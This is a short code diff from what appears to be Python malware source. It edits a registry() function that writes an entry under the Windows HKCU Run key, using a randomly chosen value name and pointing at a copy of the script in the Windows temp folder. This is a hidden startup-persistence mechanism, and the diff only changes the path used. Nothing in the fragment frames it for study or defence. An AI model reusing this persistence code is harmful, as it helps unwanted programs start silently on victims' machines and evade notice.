@@ -9,7 +9,7 @@ def registry():
 	try:
 		key = r"Software\Microsoft\Windows\CurrentVersion\Run"
 		open = OpenKey(HKEY_CURRENT_USER,key,0,KEY_ALL_ACCESS)
-		SetValueEx(open,random.choice(value_names),0,REG_SZ,"%systemroot%\\temp\\"+sys.argv[0])
+		SetValueEx(open,random.choice(value_names),0,REG_SZ,"c:\\windows\\temp\\"+sys.argv[0])
 		return True
 	except Exception as e:
 		return False
